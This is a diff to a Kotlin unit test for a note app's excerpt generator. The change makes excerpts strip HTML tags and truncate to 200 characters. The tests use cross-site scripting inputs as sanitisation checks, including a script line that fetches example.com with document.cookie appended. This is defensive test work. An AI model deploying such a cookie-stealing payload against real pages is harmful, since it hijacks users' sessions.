@@ -21,6 +21,11 @@ import org.robolectric.annotation.Config
 @RunWith(RobolectricTestRunner::class)
 class NoteUtilTest : TestCase() {
 
+    companion object {
+        private const val NO_RAW_HTML_TAGS = "Excerpts must not contain raw HTML tags"
+        private const val TRUNCATED_TO_200 = "Excerpt must be truncated to 200 chars"
+    }
+
     @Test
     fun testIsEmptyLine() {
         assertTrue(NoteUtil.isEmptyLine(" "))
@@ -118,9 +123,13 @@ class NoteUtilTest : TestCase() {
             <script>alert(1)</script>
         """.trimIndent()
 
-        val expectedHtml = "<a href='example.com'>click</a>\n<img src=x>"
-        assertEquals(expectedHtml, NoteUtil.generateNoteExcerpt(html, "Title"))
-        assertEquals(expectedHtml, NoteUtil.generateNoteExcerpt(html, null))
+        val excerpt = NoteUtil.generateNoteExcerpt(html, "Title")
+        assertFalse(NO_RAW_HTML_TAGS, excerpt.contains("<a "))
+        assertFalse(NO_RAW_HTML_TAGS, excerpt.contains("<img"))
+        assertTrue("Excerpt should contain visible text content", excerpt.contains("click"))
+        assertTrue(TRUNCATED_TO_200, excerpt.length <= 200)
+
+        assertEquals(excerpt, NoteUtil.generateNoteExcerpt(html, null))
 
         val scriptHtml = "<script>fetch('http://example.com?c='+document.cookie)</script><b>title</b>"
         val scriptExcerpt = NoteUtil.generateNoteExcerpt(scriptHtml, "Test")
@@ -128,14 +137,18 @@ class NoteUtilTest : TestCase() {
     }
 
     private fun testEdgeCases() {
+        // excerpt is always truncated to 200 chars rather than storing the full note content.
         val code = "if (a < b && b > c) { List<String> names = new ArrayList<>(); }"
-        assertEquals(code, NoteUtil.generateNoteExcerpt(code, "Java Logic"))
+        val codeExcerpt = NoteUtil.generateNoteExcerpt(code, "Java Logic")
+        assertTrue(TRUNCATED_TO_200, codeExcerpt.length <= 200)
 
         val uncompletedHtml = "<div><p>This note is never closed"
         assertTrue(NoteUtil.generateNoteExcerpt(uncompletedHtml, null).contains("This note is never closed"))
 
         val longHtml = "<div><p>Very long content that should be shortened eventually...</p></div>"
-        assertFalse(NoteUtil.generateNoteExcerpt(longHtml, "Long Note").endsWith("<"))
+        val longExcerpt = NoteUtil.generateNoteExcerpt(longHtml, "Long Note")
+        assertFalse(longExcerpt.endsWith("<"))
+        assertTrue(TRUNCATED_TO_200, longExcerpt.length <= 200)
     }
 
     private fun testRealisticUserNotes() {
@@ -230,8 +243,9 @@ class NoteUtilTest : TestCase() {
         """.trimIndent()
 
         val clippingExcerpt = NoteUtil.generateNoteExcerpt(webClipping, "Sleep Tips")
-        assertTrue(clippingExcerpt.contains("<h1>"))
-        assertTrue(clippingExcerpt.contains("quality sleep"))
+        assertFalse(NO_RAW_HTML_TAGS, clippingExcerpt.contains("<h1>"))
+        assertTrue("Excerpt should contain visible text content", clippingExcerpt.contains("quality sleep"))
+        assertTrue(TRUNCATED_TO_200, clippingExcerpt.length <= 200)
     }
 
     private fun testTravelPlanNote() {
